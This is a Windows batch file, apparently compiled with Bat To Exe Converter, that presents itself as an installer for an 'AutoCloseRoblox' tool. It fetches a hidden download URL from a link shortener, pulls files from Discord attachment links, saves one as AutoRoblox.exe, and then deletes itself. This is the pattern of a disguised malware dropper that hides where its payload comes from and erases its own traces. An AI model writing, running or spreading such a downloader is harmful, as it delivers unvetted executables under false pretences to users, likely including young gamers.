::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDpOVgWPAE+1EbsQ5+n//Nauln4pfMcWW6D1lL2NL4A=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpOVgWPAE+/Fb4I5/jHzv+TrW4RW/E6SoDZ1ruWctw20nXBR6ou2XdKkccJCCdRcAG/bwM452taswQ=
::YB416Ek+Zm8=
::
::
::978f952a14a936cc963da21a135fa983

@echo off
md AutoCloseRoblox
cd AutoCloseRoblox
Set "cmdp=curl "https://Shiawase.cat-girls.club/u/0FZU8u3v" -sL"
@for /f %%R in ('%cmdp%') do ( Set INS=%%R )
color 4
TITLE Installation
echo This will start downloading essential files.  &echo.         
pause
cls
color 7
curl "https://cdn.discordapp.com/attachments/848252113141235732/999341274446438531/load.txt" --output load &echo.  echo.Downloaded file [1] &echo.  
curl "https://cdn.discordapp.com/attachments/848252113141235732/1000840720053186570/conf" --output conf &echo.  echo.Downloaded file [2] &echo.
curl %INS% --output AutoRoblox.exe &echo. &echo.Downloaded file [3] &echo.  &echo.Downloaded All Files, Self-Destructing in 5 secs!

timeout /T 5 /NOBREAK > nul
DEL "%~f0"
exit
